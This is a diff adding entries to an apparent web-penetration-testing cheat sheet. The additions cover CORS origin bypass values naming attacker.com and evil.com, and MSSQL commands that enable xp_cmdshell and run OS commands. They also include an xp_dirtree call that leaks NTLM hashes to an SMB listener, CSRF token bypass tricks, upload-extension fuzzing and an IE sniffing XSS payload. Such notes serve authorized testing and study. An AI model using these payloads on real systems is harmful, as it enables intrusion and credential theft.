@@ -133,6 +133,10 @@ Access-Control-Allow-Origin: *
 > Origin : https://test.site.com
 
 > Origin : https://www.site.com.attacker.com
+
+> origin : https://www.site.com attacker.com
+
+> origin : https://site.com`+=.evil.com
 ```
 
 
@@ -672,6 +676,22 @@ Limiting the number of requests made from client to server to avoid brute forcin
 # SQL Injection
 
 
+
+
+## MSSQL Injection
+
+[if stacked queries are enabled]
+
+* Configuration mssql for xp_cmd
+```sql
+> EXEC sp_configure 'show advanced options',1;RECONFIGURE;
+> EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
+```
+* performing xp_cmdshell : `xp_cmdshell 'whoami';`
+* performing samba request to a Responder.py to extract NTLM hash of the samba user : `> declare @a varchar(200);set @a='\\10.10.10.10\smbShare';exec master.dbo.xp_dirtree @a;` [giddy ippsec]
+
+
+
 ## sql-ite injection with not allowed > spaces ' " union select
 
 * `%0a` to make spaces
@@ -902,6 +922,28 @@ header("Location: https://victim.com/user/endpoint/", true, 307);
 
 For Facebook login oauth flaw if site is not using “state” parameter which is used to protect against CSRF attack, so even while adding social account from applications users setting same flawed oauth implementation is used.
 
+### Using CSRF token accross account
+
+Using same CSRF token of 1 account on another
+
+### Same length and sum
+
+Keeping length of token and SUM same. like ABC have:
+* length 3
+* A+B+C = 61+62+63 = 186
+
+SO a token like CAB,CBA etc.
+
+### Removing token entirely
+
+remove the token entriely from the request
+
+### Decoding Token
+
+If token is MD5,or base64 or something, just decode it and see.
+
+
+
 
 # XML injection
 
@@ -991,14 +1033,24 @@ data=<?=$_=~%9c%9e%8b;`$_ ../*>_`;%26name%3Dz.php%00
 so the payload will cat everthing in ../, then write to _ .
 
 
-# File Uploading Injection
+# File Uploading
 
 * Try `shell.php` , `shell.pHp5` , `shell.php4`,`shell.php4;`,`shell.php4%00` ,`shell.phtml`,`shell.pht` , `shell.pgif` , `shell.phpt`,`shell.shtml`
 * filename `<svg/onload=prompt(1)>.png`
 * see if flash file can be uploaded
 * change Content-Type , upload `shell.png` with php content and intercept request and change content-type from `png` to `php5`
 * ~~ImageTragic~~ `have to read this`
-* shell in gif/png files
+* shell in gif/png files if there is file include
+
+* Fuzzing for bad extensions available:
+	* a.'gif
+	* a."gif
+	* ``` a.`gif ```
+	* a.\.gif
+
+* IE content sniffing
+	* In IE, and unknown extension like `a.''gif` with content `GIF8;<Script>alert(1);` will be trated as text/HTML .
+
 
 # LDAP
 
